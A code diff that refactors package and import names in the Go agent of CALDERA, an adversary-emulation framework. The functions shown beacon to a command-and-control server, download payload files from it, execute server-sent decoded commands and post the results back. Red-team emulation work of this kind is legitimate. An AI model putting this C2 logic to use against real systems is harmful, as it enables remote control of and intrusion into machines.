@@ -1,4 +1,4 @@
-package modules
+package api
 
 import (
 	"bytes"
@@ -11,6 +11,8 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"../util"
+	"../execute"
 )
 
 // Beacon is a single call to the C2
@@ -27,7 +29,7 @@ func Beacon(server string, paw string, group string, files string) interface{} {
 func Drop(server string, files string, command map[string]interface{}) {
 	payload := command["payload"].(string)
 	location := filepath.Join(files, payload)
-	if len(payload) > 0 && Exists(location) == false {
+	if len(payload) > 0 && util.Exists(location) == false {
 		address := fmt.Sprintf("%s/file/download", server)
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
@@ -44,21 +46,21 @@ func Drop(server string, files string, command map[string]interface{}) {
 
 // Results executes a command and posts results to CALDERA
 func Results(server string, paw string, command map[string]interface{}) {
-	cmd := string(Decode(command["command"].(string)))
+	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
-	result, err := Execute(cmd)
+	result, err := execute.Execute(cmd)
 	if err != nil {
 		status = "1"
 	}
 	address := fmt.Sprintf("%s/sand/results", server)
 	link := fmt.Sprintf("%f", command["id"].(float64))
-	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(Encode(result)), "status": status})
+	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
 	request(address, paw, data)
 	time.Sleep(time.Duration(command["sleep"].(float64)) * time.Second)
 }
 
 func request(address string, paw string, data []byte) []byte {
-	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(Encode(data)))
+	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
 	req.Header.Set("X-PAW", paw)
 	client := &http.Client{}
 	resp, err := client.Do(req)
@@ -66,5 +68,5 @@ func request(address string, paw string, data []byte) []byte {
 		return nil
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
-	return Decode(string(body))
+	return util.Decode(string(body))
 }
